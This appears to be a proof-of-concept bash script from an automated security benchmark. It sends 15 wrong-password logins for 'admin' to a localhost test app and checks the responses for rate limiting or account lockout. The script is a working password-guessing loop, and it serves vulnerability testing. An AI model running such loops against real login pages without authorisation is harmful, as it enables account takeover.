#!/bin/bash
# POC: Demonstrates absence of brute force protection by attempting 15 consecutive failed logins with no rate limiting, account lockout, or delays
# Target: ./repo
# Created: 2025-10-31T17:01:33.387Z
# Session: benchmark-XBEN-055-24-mhf2us8d

echo "========================================"
echo "POC: Missing Brute Force Protection"
echo "========================================"
echo ""
echo "Testing: 15 consecutive failed login attempts"
echo "Expected: No rate limiting, no lockout, all attempts succeed with HTTP 200"
echo ""

TARGET="http://localhost:3000/index.php"
USERNAME="admin"
FAILED_COUNT=0
SUCCESS_COUNT=0

echo "Starting brute force test..."
echo ""

for i in {1..15}; do
    START_TIME=$(date +%s%N)
    
    # Attempt login with incorrect password
    HTTP_CODE=$(curl -s -w "%{http_code}" -o /tmp/response_$i.txt \
        "${TARGET}?username=${USERNAME}&password=wrongpass${i}" 2>/dev/null)
    
    END_TIME=$(date +%s%N)
    DURATION=$((($END_TIME - $START_TIME) / 1000000)) # Convert to milliseconds
    
    # Check response
    RESPONSE=$(cat /tmp/response_$i.txt)
    
    echo "Attempt $i:"
    echo "  HTTP Status: $HTTP_CODE"
    echo "  Response Time: ${DURATION}ms"
    
    # Check for rate limiting indicators
    if echo "$RESPONSE" | grep -qi "too many\|rate limit\|locked\|blocked\|captcha\|wait"; then
        echo "  Result: ⚠️  RATE LIMITING DETECTED"
        FAILED_COUNT=$((FAILED_COUNT + 1))
    elif [ "$HTTP_CODE" = "429" ]; then
        echo "  Result: ⚠️  HTTP 429 (Too Many Requests)"
        FAILED_COUNT=$((FAILED_COUNT + 1))
    elif [ "$HTTP_CODE" = "200" ]; then
        echo "  Result: ✓ Request accepted (HTTP 200 - No protection)"
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    else
        echo "  Result: HTTP $HTTP_CODE"
    fi
    
    # Clean up temp file
    rm -f /tmp/response_$i.txt
    
    echo ""
    
    # Small delay to make timing visible
    sleep 0.1
done

echo "========================================"
echo "RESULTS:"
echo "========================================"
echo "Total attempts: 15"
echo "Successful attempts (HTTP 200): $SUCCESS_COUNT"
echo "Blocked attempts: $FAILED_COUNT"
echo ""

if [ $SUCCESS_COUNT -eq 15 ]; then
    echo "❌ VULNERABILITY CONFIRMED: No brute force protection"
    echo "❌ All 15 attempts were accepted without rate limiting"
    echo "❌ No account lockout mechanism detected"
    echo "❌ No progressive delays observed"
    echo ""
    echo "IMPACT: Attackers can perform unlimited password guessing attacks"
    exit 0
elif [ $SUCCESS_COUNT -gt 10 ]; then
    echo "⚠️  WEAK PROTECTION: Most attempts succeeded ($SUCCESS_COUNT/15)"
    echo "⚠️  Protection is insufficient to prevent brute force attacks"
    exit 0
else
    echo "✓ PROTECTION DETECTED: Only $SUCCESS_COUNT/15 attempts succeeded"
    echo "Rate limiting or account lockout appears to be working"
    exit 1
fi